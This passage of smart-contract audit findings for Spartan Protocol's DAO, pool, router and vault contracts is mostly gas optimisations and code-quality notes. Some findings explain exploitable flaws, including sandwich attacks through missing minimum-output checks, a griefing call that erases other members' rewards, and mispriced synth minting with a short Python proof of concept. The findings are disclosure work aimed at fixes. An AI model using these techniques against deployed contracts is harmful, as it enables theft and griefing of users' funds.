https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L205  _RESERVE: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L188  etc.  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  At a minimum, all DAO public/external functions should check and revert if daoHasMoved or the design can even consider a selfdestruct to destroy the DAO contract once it has successfully handed over to the new DAO contract and all pending actions have been cleared. In the unlikely requirement of older DAO contracts continuing to exist, they should at least use addresses of interfacing contracts as reported by the new DAO which could have updated them.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  Event log poisoning is possible by griefing attackers who have no DAO weight but vote and emit event that takes up event log space.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L382  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L393   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Emit event only if non-zero weight as relevant to proposal voting/cancelling.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The DAO codebase not handle deflationary asset tokens. However, this is handled in similar _handleTransferIn functions of Router and poolFactory which indicates that protocol allows/anticipates listing of deflationary tokens which require a start balance check/subtraction before and after transfers to account for the actual amount transferred instead of taking the face-value amount from the parameter without considering any transfer fees imposed by the token contract.  Rationale for Medium severity: This is typically a low-severity finding in protocols that uniformly do not handle deflationary/inflationary/rebasing tokens because they either whitelist-away such tokens or do not anticipate handling them (by documenting and warning users) in their protocols. Spartan however has code indicative of expecting/handling deflationary tokens in Router and poolFactory but is missing similar special handling in DAO which is a case of missed handling and so is more serious because it leads to mis-accounting and potential fund loss in different parts of the protocol code.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L266  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L206-L208  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L111-L113  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add code similar to Router and poolFactory to handle deflationary tokens in DAO.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The state variables corresponding to setGenesisFactors() parameters _coolOff, _daysToEarn, _majorityFactor, _daoClaim and_daoFee are declared to be uint256 but are set using these parameters that are uint32. While it’s unlikely that these will need values > uint32, this leads to wastage of storage slots and gas.   ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L128  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L21-L24  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L19   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  The state variables can be declared uint32 to fit all five of them in a single slot and this will lead to efficient SSTOREs because they are set together. If values > uint32 are relevant, then the parameter types of setter setGenesisFactors() have to be changed.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The DAO member withdrawal is missing an emit for MemberWithdraws event. This results in lack of transparency and off-chain monitoring capability.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L78  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L170-L174   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add an emit for the event or otherwise rationalize/document why it isn’t necessary and remove the event declaration.  
# Handle  natus   # Vulnerability details  ## Impact Here we return a value that isnt used anywhere which can safely be removed. This will save the return and also memory store gas costs  If the asset is not BNB/WBNB; we also get the startBal which is another memory store that isnt required, but more importantly we do a more expensive call to check the balance of the token in the pool contract which isnt required. This goes a step further at the 'actual' step at the end where we call the balance again and then do a MINUS math operation calling the memory value  Removing those lines will make all transactions cheaper that involve moving assets through the ROUTER, which appears to be quite a lot and sometimes even multiple times per function   ## Proof of Concept     ROUTER lines #197 to #211  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L197        ## Recommended Mitigation Steps     Remove these lines: #204 #206 #208  Also remove the return: returns(uint256 actual)  
# Handle  natus   # Vulnerability details  ## Impact     This is called with every dividend-generating txn (which is 100 or so txns per day/era by default and can be cranked up with an increase in txn volume, so higher importance than some of the other gas opts)       This is a little harder to optimize as it uses the changed state within the same function; however there is still room for optimization despite that; see below.   arrayFeeSize is called from storage twice every time; and if the array is fully built it's also called another 20 times (by default; can be increased by dao) per call to this function. As this variable doesn't change within this function; it can simply be called once at the started and stored in memory, should be a decent gas opt in a very commonly occuring txn  feeArray is also called from storage only once whilst the array is still building and not complete (this is okay) but once it's built it's called 20 times (again; by default; this might be raised) If we instead call this from storage once *just before* it's required in the loop (has to be after addFee() as this changes that feeArray's state) we can save even more gas  also; arrayFeeLength does not need to be stored in memory; just use feeArray.length from torage instead (only used once, so will only save the memory storage gas which is small)      ## Proof of Concept    ROUTER lines #285 to #297 https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L285      ## Recommended Mitigation Steps    Step1: add at the start of the function: uint _arrayFeeSize = arrayFeeSize (Get storage arrayFeeSize & store in memory)  Step2: Replace all 3 instances of arrayFeeSize with _arrayFeeSize  Step3: add below addFee(_fee): uint [] memory _feeArray = feeArray (Get storage feeArray & store in memory)  Step4: replace feeArray[i] (inside the loop) to _feeArray[i]  Step5: remove line: uint arrayFeeLength = feeArray.length and replace arrayFeeLength with feeArray.length; no need to store in memory if its only used once  
# Handle  tensors   # Vulnerability details  ## Impact There are no minimum amounts out, or checks that frontrunning/slippage is sufficiently mitigated. This means that anyone with enough capital can force arbitrarily large slippage by sandwiching transactions, close to 100%.   ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L284  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L296  ## Recommended Mitigation Steps Add a minimum amount out parameter. The function reverts if the minimum amount isn't obtained.  
# Handle  natus   # Vulnerability details  ## Impact    This function calls revenueArray from storage when setting 'n' and then twice every loop (revenueArray[i] && revenueArray[i - 1]) and then again after the loop once.       If this was instead called once at the start and stored in memory; iterated and then assigned into the storage at the end; could save some gas       ## Proof of Concept   SYNTHVAULT lines #249 to #255     https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L249       ## Recommended Mitigation Steps   Step1: Above line #249; add in:   uint [] memory _revArray = revenueArray  (Get the storage revenueArray and store it in memory)      Step2: change revenueArray.length to _revArray.length  (maybe even remove this memory variable and just call the length directly in the loop conditions in place of 'n'?)     Step3: change:   revenueArray[i] = revenueArray[i - 1]   to:   _revArray[i] = _revArray[i - 1]      Step4: change:   revenueArray[0] = _fee   To:   _revArray[0] = _fee      Step5: add:   revenueArray = _revArray  as the final line inside the function  
# Handle  natus   # Vulnerability details  ## Impact    Here we call the storage stakedSynthAssets 3 times in the loop or 4 times per loop if the reward is > 0.   It could instead be called once before the loop and stored in memory. Will save more gas as time goes on and the stakedSynthAssets array potentially gets larger as more assets get listed      ## Proof of Concept   SYNTHVAULT lines #121 to #132   https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L121      ## Recommended Mitigation Steps   Step1: Above line #122; add in:   address [] memory _stakedSynthAssets = stakedSynthAssets  (Get the storage stakedSynthAssets and store it in memory)     Then: replace all 4 instances of:  stakedSynthAssets with _stakedSynthAssets  
# Handle  natus   # Vulnerability details  ## Impact   This function calls revenueArray from storage when setting 'n' and then twice every loop (revenueArray[i] && revenueArray[i - 1]) and then again after the loop once.     If this was instead called once at the start and stored in memory; iterated and then assigned into the storage at the end; could save some gas     ## Proof of Concept  POOL lines #357 to #363   https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L357     ## Recommended Mitigation Steps  Step1: Above line #358; add in:  uint [] memory _revArray = revenueArray (Get the storage revenueArray and store it in memory)    Step2: change revenueArray.length to _revArray.length    Step3: change:  revenueArray[i] = revenueArray[i - 1]  to:  _revArray[i] = _revArray[i - 1]    Step4: change:  revenueArray[0] = _fee  To:  _revArray[0] = _fee    Step5: add:  revenueArray = _revArray as the final line inside the function  
# Handle  natus   # Vulnerability details  ## Impact  This function calls feeArray from storage when setting 'n' and then twice every loop (feeArray[i] && feeArray[i - 1]) and then again after the loop once.   If this was instead called once at the start and stored in memory; iterated and then assigned into the storage at the end; could save some gas   ## Proof of Concept UTILS lines #300 to #306  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L301    ## Recommended Mitigation Steps Step1: Above line #301; add in: uint [] memory _feeArray = feeArray (Get the storage feeArray and store it in memory)  Step2: change feeArray.length to _feeArray.length  Step3: change: feeArray[i] = feeArray[i - 1] to: _feeArray[i] = _feeArray[i - 1]  Step4: change: feeArray[0] = _fee To: _feeArray[0] = _fee  Step5: add: feeArray = _feeArray  as the final line inside the function  
# Handle  hrkrshnn   # Vulnerability details  ## Use unchecked blocks when safemath is not required  In some cases, it's unnecessary to use the default checked arithmetic. In such cases, wrapping the block in unchecked would save gas.  One example is:  ``` diff @@ -271,11 +272,13 @@ contract Pool is iBEP20 {       // Check the TOKEN amount received by this Pool      function _getAddedTokenAmount() internal view returns(uint256 _actual){ -        uint _tokenBalance = iBEP20(TOKEN).balanceOf(address(this)); -        if(_tokenBalance > tokenAmount){ -            _actual = _tokenBalance-(tokenAmount); -        } else { -            _actual = 0; +        uint _tokenBalance = iBEP20(TOKEN).balanceOf(address(this)); +       unchecked { +            if(_tokenBalance > tokenAmount){ +                _actual = _tokenBalance-(tokenAmount); +            } else { +                _actual = 0; +            }  ```  For loops, such optimizations would save a lot of gas.  ``` diff @@ -356,9 +359,11 @@ contract Pool is iBEP20 {       function addFee(uint _rev) internal {          uint _n = revenueArray.length; // 2 +       require(_n > 0); +       unchecked {          for (uint i = _n - 1; i > 0; i--) {              revenueArray[i] = revenueArray[i - 1];          } +       }          revenueArray[0] = _rev;      }  } ```   
# Handle  hrkrshnn   # Vulnerability details  ## Variables that can be converted into immutable  ``` txt Warning: Variable declaration can be converted into an immutable.   --> contracts/BondVault.sol:12:5:    | 12 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Dao.sol:16:5:    | 16 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Dao.sol:18:5:    | 18 |     uint256 public secondsPerEra;   // Amount of seconds per era (Inherited from BASE contract; intended to be ~1 day)    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/DaoVault.sol:12:5:    | 12 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/DaoVault.sol:13:5:    | 13 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:14:5:    | 14 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:15:5:    | 15 |     address public TOKEN;    |     ^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:16:5:    | 16 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:19:5:    | 19 |     uint8 public override decimals; uint256 public override totalSupply;    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:27:5:    | 27 |     uint public genesis; // Timestamp from when the pool was first deployed (For UI)    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Router.sol:9:5:   | 9 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Router.sol:10:5:    | 10 |     address public WBNB;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Router.sol:11:5:    | 11 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Synth.sol:7:5:   | 7 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Synth.sol:8:5:   | 8 |     address public LayerONE; // Underlying relevant layer1 token   |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Synth.sol:9:5:   | 9 |     uint public genesis;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Synth.sol:10:5:    | 10 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Synth.sol:13:5:    | 13 |     uint8 public override decimals; uint256 public override totalSupply;    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Utils.sol:10:5:    | 10 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Utils.sol:11:5:    | 11 |     uint public one = 10**18;    |     ^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/FallenSpartans.sol:10:5:    | 10 |     address public SPARTA;    |     ^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/FallenSpartans.sol:11:5:    | 11 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/FallenSpartans.sol:12:5:    | 12 |     uint256 public genesis;    |     ^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/outside-scope/Reserve.sol:8:5:   | 8 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/Sparta.sol:30:5:    | 30 |     uint256 private _100m;    |     ^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/Sparta.sol:31:5:    | 31 |     uint256 public maxSupply;    |     ^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/Sparta.sol:38:5:    | 38 |     address public BASEv1;    |     ^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/poolFactory.sol:7:5:   | 7 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/poolFactory.sol:8:5:   | 8 |     address public WBNB;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/poolFactory.sol:10:5:    | 10 |     uint public curatedPoolSize;    // Max amount of pools that can be curated status    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/synthFactory.sol:6:5:   | 6 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/synthFactory.sol:7:5:   | 7 |     address public WBNB;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/synthVault.sol:14:5:    | 14 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/synthVault.sol:15:5:    | 15 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/synthVault.sol:23:5:    | 23 |     uint public genesis;                // Timestamp from when the synth was first deployed (For UI)    |     ^^^^^^^^^^^^^^^^^^^  ```   Instead of using an expensive `sload` operation, converting to immutable would make reading to cost just 3 gas.   ## Tools Used  A custom compiler.  
# Handle  jonah1005   # Vulnerability details  ## Impact When users try to born synth, the fee and the value of Sparta is calculated at contract `Pool` while the logic of burning `Pool`s Lp and Synth is located at `Synth` contract.  Users can send synth to the `Synth` contract directly and trigger `burnSynth` at the `Pool` contract. The Pool would not send any token out while the `Synth` contract would burn the lp and Synth. While users can not drain the liquidity by doing this, breaking the AMM rate unexpectedly is may lead to troubles.  The calculation of debt and the fee would end up with a wrong answer.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L245  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L174  ## Tools Used None  ## Recommended Mitigation Steps  Pool's `burnSynth` and Synth's `burnSynth` are tightly coupled functions. In fact, according to the current logic, `Synth:burnSynth` should only be triggered from a valid `Pool` contract.  IMHO, applying the`Money in - Money Out` model in the `Synth` contract does more harm than good to the readability and security of the protocol. Consider to let `Pool` contract pass the parameters to the `Synth` contract and add a require check in the `Synth` contract.    
# Handle  hickuphh3   # Vulnerability details  ### Impact  `hasMinority()` is defined as a public function, but is unused in the contract. It can either be entirely removed or have its visibility changed to `external`.  
# Handle  GalloDaSballo   # Vulnerability details  ## Impact The function `_deposit` sets `mapMemberSynth_lastTime` to a date in the future https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107   `mapMemberSynth_lastTime` is also used to calculate rewards earned  `depositForMember` allows anyone, to "make a donation" for the member and cause that member to loose all their accrued rewards  This can't be used for personal gain, but can be used to bring misery to others.   ## Proof of Concept `depositForMember` https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L95 and can be called by anyone  This will set the member  ```  mapMemberSynth_lastTime[_member][_synth] = block.timestamp + minimumDepositTime; // Record deposit time (scope: member -> synth) ```  this can be continuously exploited to make members never earn any reward   ## Recommended Mitigation Steps  This is the second submission under the same exploit This can be mitigated by harvesting for the user right before changing `mapMemberSynth_lastTime[_member][_synth]`  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107  
# Handle  natus   # Vulnerability details  ## Impact  Gas optimization / non-critical issue. Wasted lines of code creating and setting a local variable that does not appear to be required. I can't think of a reason to leave it in.    ## Proof of Concept _token local variable is not used anywhere in the codebase. Can be removed to save gas and compile size. Looks like it's to handle WBNB (if it was required) but forgot to check/remove after it was catered for elsewhere. - https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L83    ## Tools Used N/A    ## Recommended Mitigation Steps ROUTER.addLiquiditySingleForMember() - Remove line #82 - Remove line #83  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The `calcLiquidityUnitsAsym()` function's last 2 lines are:  ```jsx uint two = 2; return (totalSupply * amount) / (two * (amount + baseAmount)); ```  The `two` assignment seems unnecessary.  ### Recommended Mitigation Steps  `return (totalSupply * amount) / (two * (amount + baseAmount));`  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `newParamProposal()` takes in a `uint32 param` as an input argument. The valid scenarios for this proposal are for changing the cooloff period and erasToEarn via the `changeCooloff()` and `changeEras()`. These functions however cast the `param` to `uint256` before assigning it to the relevant variable.   We therefore have either of the following cases:  1.  `uint32 param` should be increased to `uint256 param` 2. `coolOffPeriod` and `erasToEarn` can be decreased in size to `uint32` instead of `uint256`. For further optimizations, these 2 variables should be grouped together so that they take up 1 storage slot instead of 2 separate ones.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `BASE` is defined as an `address` type, but is casted as `iBEP20` in almost every instance within the Dao contract, and in numerous instances in many other contracts as well. It would therefore be better to define it as `iBEP20` instead, to avoid casting.  ### Recommended Mitigation Steps  Change `address public BASE;` to `iBEP public BASE`. Castings of `BASE` to `iBEP20` can be removed subsequently.  
# Handle  jonah1005   # Vulnerability details  ## Impact `Pool` calculates the amount to be minted based on `token_amount` and `sparta_amount` of the Pool. However, since `token_amount` in the pool would not decrease when users mint Synth, it's always cheaper to mint synth than swap the tokens.  The synthetics would be really hard to be on peg. Or, there would be a flash-loan attacker to win all the arbitrage space.  ## Proof of Concept Pool's mint synth https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242  The synth amount is calculated at L:232 ``` uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount); ``` which is the same as swapping base to token at L:287 ``` uint256 _X = baseAmount; uint256 _Y = tokenAmount; _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output ```  However, while swapping tokens decrease pool's token, mint just mint it out of the air.  Here's a POC: Swap sparta to token for ten times ```python for i in range(10):     amount = 10 * 10**18     transfer_amount = int(amount/10)     base.functions.transfer(token_pool.address, transfer_amount).transact()     token_pool.functions.swapTo(token.address, user).transact() ```  Mint Synth for ten times ```python for i in range(10):     amount = 10 * 10**18     transfer_amount = int(amount/10)     base.functions.transfer(token_pool.address, transfer_amount).transact()     token_pool.functions.mintSynth(token_synth.address, user).transact() ``` The Pool was initialized with 10000:10000 in both cases. While the first case(swap token) gets `4744.4059` and the second case gets `6223.758`.  ## Tools Used None ## Recommended Mitigation Steps The debt should be considered in the AMM pool.  I recommend to maintain a debt variable in the Pool and use `tokenAmount - debt` when the Pool calculates the token price. Here's some idea of it. ```     uint256 public debt;     function _tokenAmount() returns (uint256) {         return tokenAmount - debt;     }      // Swap SPARTA for Synths     function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {         require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, "!synth"); // Must be a valid Synth         uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount          // Use tokenAmount - debt to calculate the value         uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, _tokenAmount()); // Calculate value of swapping SPARTA to the relevant underlying TOKEN          // increment the debt         debt += output          uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted         _incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount         uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN         fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA         _mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold         iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user         _addPoolMetrics(fee); // Add slip fee to the revenue metrics         emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);       return (output, fee);     }  ```   
# Handle  hickuphh3   # Vulnerability details  ### Impact  The lines below of the `addLiquiditySingleForMember()` function  ```jsx address _token = token; if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB ```  are redundant since `_token` is not used subsequently. Note that `_handleTransferIn()` will perform the handling of native BNB transfers.  ### Recommended Mitigation Steps  The mentioned lines above can be removed.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  ```jsx // Pool.sol: L344-345 map30DPoolRevenue = 0; map30DPoolRevenue = map30DPoolRevenue+(_fee);  // Router.sol: L317-318 mapAddress_30DayDividends[_pool] = 0; mapAddress_30DayDividends[_pool] = mapAddress_30DayDividends[_pool] + _fees; ```  can simply be written as  ```jsx map30DPoolRevenue = _fee;  mapAddress_30DayDividends[_pool] = _fees; ```  respectively.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The contract performs allowance checks for transfers in 2 ways:  1. Check allowance is greater than requested amount, revert otherwise. Then do allowance decrement. (Eg. in `transferFrom`) 2. Directly do the allowance decrement, will revert for underflow since sol 0.8.3 is used. (Eg. in `burnFrom`  It is best to stick to 1 method for consistency. For gas optimizations, the 2nd method is better, but the first provides more meaningful revert messages to aid debugging.  ### Recommended Mitigation Steps  Commit to either method, not both.  
# Handle  hickuphh3   # Vulnerability details  ```jsx function isEqual(bytes memory part1, bytes memory part2) external pure returns(bool equal){   if(sha256(part1) == sha256(part2)){       return true;   } } ```  Both implementations can be simplified and made consistent to be  ```jsx function isEqual(bytes memory part1, bytes memory part2) external pure returns(bool){   return(sha256(part1) == sha256(part2)); } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  In DaoVault and BondVault, the following mappings are declared private:  - `mapMember_weight` - `mapMemberPool_weight`  The DaoVault has an additional private mapping `mapMemberPool_balance`.  Despite this, the DaoVault has getter methods for all 3 mappings, whilst the BondVault only has a getter method for `mapMember_weight`.  The getter methods (which aren't included in the interface) would be unnecessary if the mappings are declared as public. Also, the BondVault might perhaps be lacking a view method for `mapMemberPool_weight`.   Should the separate getter methods remain unchanged, note that the getter method for `getMemberWeight()` has a convoluted implementation:  ```jsx function getMemberWeight(address member) external view returns (uint256) {  if (mapMember_weight[member] > 0) {   return mapMember_weight[member];   } else {     return 0;     } } ```  which can be simplified to simply returning the `mapMember_weight[member]`.  ### Recommended Mitigation Steps  - Declare the relevant private mappings as public. - Kindly check if `mapMemberPool_weight` should be public for the BondVault as well, since it is the case for the DaoVault.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The `hasMajority()`, `hasQuorum()` and `hasMinority()` functions contains the following implementation:  ```jsx if(votes > consensus){  return true; } else {  return false; } ```  This can be reduced to `return (votes > consensus);`  
# Handle  hickuphh3   # Vulnerability details  ### Impact  - `_pool` is fetched once in `claimForMember()`, but is fetched again in its sub function `decreaseWeight()`. Since `decreaseWeight()` is solely called by `claimForMember()`, the `_pool` variable can be passed as an input to `decreaseWeight()` to avoid having to retrieve its value again. - In `increaseWeight()` and `decreaseWeight()`, zeroing out `mapMemberPool_weight` is redundant as it is set to another value 2 lines later.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `uint private lastMonth; // Timestamp of the start of current metric period (For UI)`   There is no getter method for `lastMonth`, which makes the (For UI) comment is erroneous.  ### Recommended Mitigation Steps  Make it `public` or edit the comment  
# Handle  hickuphh3   # Vulnerability details  ### Impact  1. `DEPLOYER` is set in the constructor but is not used anywhere in the contract 2. Redundant initialization `lastMonth = 0;` 3. `genesis` and `decimals` can have the `immutable` keywords since they are only set in the constructor and can't be changed 4. `iUTILS(_DAO().UTILS())` is called many times in `mintSynth()`, `removeForMember()` and `_swap*()` functions. Recommend storing as a local variable in these functions. 5. Since `revenueArray` cannot exceed length 2, the `addFee` function can be directly incorporated into the `addRevenue` function. Its for loop can be replaced with direct replacement of values. Also, `revenueArray.length != 2` is cleaner and easier to read compared to `!(revenueArray.length == 2)`. Given its purpose and usage, `archiveRevenue` / `cachePastRevenue` seems to be a better function name. If it is clear that revenueArray will be kept constant at 2, an alternative is to simply store the values as 2 separate variables.  ### Recommended Mitigation Steps  1. Remove `DEPLOYER` 2. Remove the initialization `lastMonth = 0;` 3. `uint public immutable genesis;` and `uint8 public immutable override decimals;` 4. `iUTILS utils = _DAO().UTILS();` should utils be called more than once in a function 5. Possible implementation below  ```jsx function archiveRevenue(uint _totalRev) {  if (revenueArray.length == 2) {   // shift value to the right   revenueArray[1] = revenueArray[0];   revenueArray[0] = _totalRev;   } else {     // populate revenueArray to be of length 2     revenueArray.push(_totalRev);   } } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  - `calcClaimBondedLP()` returns `_BONDVAULT.calcBondedLP(()` which is a view function. Hence, `calcClaimBondedLP()` can be a view function as well. - `hasMinority()` is not called within the contract. Hence, the `public` keyword can be reduced to `external` to save gas.  ### Recommended Mitigation Steps  - Restrict `calcClaimBondedLP()` visibility to `view` (ie. add `view` keyword). - Reduce `hasMinority()` from `public` to `external`  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `_handleTransferIn()`, `DEPLOYER` and `onlyDAO()` are defined but unused. Hence, they can be removed from the contract.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The `swapTo()` function should not be payable since the WBNB-SPARTA pool should not receive BNB, but WBNB. The router swap functions handles the wrapping and unwrapping of BNB.  Furthermore, the `swapTo()` will not detect any deposited BNB, so any swapTo() calls that have msg.value > 0 will have their BNB permanently locked in the pool contract.   ### Recommended Mitigation Steps  Remove `payable` keyword in `swapTo()`.  
